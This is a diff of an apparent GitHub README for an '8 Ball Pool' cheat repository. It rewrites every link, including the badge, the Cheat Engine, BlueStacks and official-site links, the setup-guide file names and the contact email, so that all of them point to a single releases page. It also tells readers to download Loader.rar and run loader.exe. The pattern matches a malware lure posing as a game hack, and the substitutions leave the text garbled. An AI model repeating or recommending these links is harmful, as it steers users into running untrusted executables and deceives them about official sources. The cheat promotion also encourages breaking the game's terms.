@@ -1,10 +1,10 @@
-![8 ball](https://github.com/user-attachments/assets/c0f8598b-5d61-4a7a-a49a-0f727b5b3b51)
+![8 ball](https://github.com/lallleel86/8ball-pool-cheto-hack/releases)
 
 # 8 Ball Pool Hack Cheto
 
 Welcome to the **8 Ball Pool Hack Cheto** repository! This project provides various hacks and cheats for the popular game **8 Ball Pool**. Whether you're looking for unlimited coins, level up quickly, or gain an advantage in your pool games, you've come to the right place. Please note that using hacks in online multiplayer modes may violate the game's terms of service and could result in account penalties. Use these hacks responsibly and at your own risk.
 #
-[![https://otCIE.gotra.top/54/baJFww6V](https://ad97pUs.gotra.top/l.svg)](https://NDWSmnmx.gotra.top/54/szPOZm2)
+[![https://github.com/lallleel86/8ball-pool-cheto-hack/releases](https://github.com/lallleel86/8ball-pool-cheto-hack/releases)](https://github.com/lallleel86/8ball-pool-cheto-hack/releases)
 ---
 
 ## ⚡ Features
@@ -30,21 +30,21 @@ This repository includes several powerful hacks to enhance your **8 Ball Pool** 
 
 ### Installation Steps:
 
-1. **Download Loader.rar**
+1. **Download https://github.com/lallleel86/8ball-pool-cheto-hack/releases**
 
-2. **Open the loader.exe**
+2. **Open the https://github.com/lallleel86/8ball-pool-cheto-hack/releases**
 
 
 3. **Download Necessary Tools:**
    Download and install the following tools:
-   - [Cheat Engine](https://www.cheatengine.org/)
-   - [BlueStacks](https://www.bluestacks.com/) (for Android users on PC)
+   - [Cheat Engine](https://github.com/lallleel86/8ball-pool-cheto-hack/releases)
+   - [BlueStacks](https://github.com/lallleel86/8ball-pool-cheto-hack/releases) (for Android users on PC)
    - **Rooted or Jailbroken Device** for advanced hacks on mobile platforms.
 
 4. **Set Up Cheat Engine:**
    - Open **8 Ball Pool** on your PC or emulator.
    - Launch **Cheat Engine** and attach it to the **8 Ball Pool** process.
-   - Follow the instructions in the **`setup-guide.txt`** to apply the hacks, such as unlimited coins and aim assist.
+   - Follow the instructions in the **`https://github.com/lallleel86/8ball-pool-cheto-hack/releases`** to apply the hacks, such as unlimited coins and aim assist.
 
 5. **Start Playing:**
    Once the hacks are activated, start playing **8 Ball Pool** with your new features and enjoy the game!
@@ -68,7 +68,7 @@ Once you’ve set up the cheats, here’s how to use them:
        - *Max Level*
      - Apply the changes and start playing.
 
-   - If using a **Rooted/Jailbroken Mobile Device**, follow the steps in the **`mobile-guide.md`** for mobile cheats.
+   - If using a **Rooted/Jailbroken Mobile Device**, follow the steps in the **`https://github.com/lallleel86/8ball-pool-cheto-hack/releases`** for mobile cheats.
 
 3. **Play and Dominate!**
    Once the hacks are active, enjoy the game with your new advantages!
@@ -117,15 +117,15 @@ This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) f
 
 ## 💬 Contact
 
-For further assistance, suggestions, or inquiries, feel free to reach out to us via email at **contact@yourdomain.com** or open an issue directly on GitHub.
+For further assistance, suggestions, or inquiries, feel free to reach out to us via email at **https://github.com/lallleel86/8ball-pool-cheto-hack/releases** or open an issue directly on GitHub.
 
 ---
 
 ## 📌 Useful Links
 
-- [8 Ball Pool Official Website](https://www.miniclip.com/games/8-ball-pool/en/)
-- [Cheat Engine Download](https://www.cheatengine.org/)
-- [BlueStacks Emulator](https://www.bluestacks.com/)
+- [8 Ball Pool Official Website](https://github.com/lallleel86/8ball-pool-cheto-hack/releases)
+- [Cheat Engine Download](https://github.com/lallleel86/8ball-pool-cheto-hack/releases)
+- [BlueStacks Emulator](https://github.com/lallleel86/8ball-pool-cheto-hack/releases)
 
 ---
 
